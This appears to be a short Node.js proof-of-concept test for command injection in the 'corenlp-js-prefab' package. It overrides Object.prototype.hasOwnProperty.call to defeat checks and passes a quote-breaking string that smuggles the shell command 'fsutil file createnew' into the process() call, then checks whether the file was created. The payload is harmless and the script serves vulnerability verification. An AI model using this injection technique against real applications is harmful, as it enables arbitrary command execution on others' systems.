Object.prototype.hasOwnProperty.call = () => true;
const a = require('corenlp-js-prefab');
const fs = require('fs');
const path = './corenlp-js-prefab';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    a.process('\') fsutil file createnew corenlp-js-prefab 0 # \'');
} catch (error) {
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});